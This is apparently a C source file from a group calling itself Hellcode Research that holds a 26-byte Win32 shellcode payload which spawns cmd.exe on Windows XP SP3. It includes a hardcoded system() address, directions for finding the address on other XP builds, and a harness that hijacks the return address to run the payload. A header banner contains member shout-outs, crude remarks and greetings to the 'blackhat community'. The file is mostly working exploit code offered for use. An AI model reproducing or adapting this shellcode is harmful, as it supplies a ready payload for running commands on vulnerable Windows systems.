/*

26 Bytes Win32 Shellcode (cmd.exe) for XP SP3 English
Author: Hellcode Research || TCC (The Computer Cheats)
http://tcc.hellcode.net
memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob

from murderkey: I love you merve lol
from karak0rsan: fuck u "ysmn" lol || eternal love kubr4 ||
notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]
merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]

Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community

"\xc7\x93\xc2\x77" is the system address. (0x77c293c7)
You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)
(Open MSVCRT.DLL via Dependency Walker,
find system function's address and MSVCRT's Preferred Base address
system + preferred base = System Address ;] )

*/

#include <windows.h>
#include <winbase.h>


unsigned char hellcodenet[]=
"\x8b\xec\x55\x8b\xec"
"\x68\x65\x78\x65\x2F"
"\x68\x63\x6d\x64\x2e"
"\x8d\x45\xf8\x50\xb8"
"\xc7\x93\xc2\x77"
"\xff\xd0"
;

int main ()
{
int *ret;
ret=(int *)&ret+2;
(*ret)=(int)hellcodenet;
return 0;
}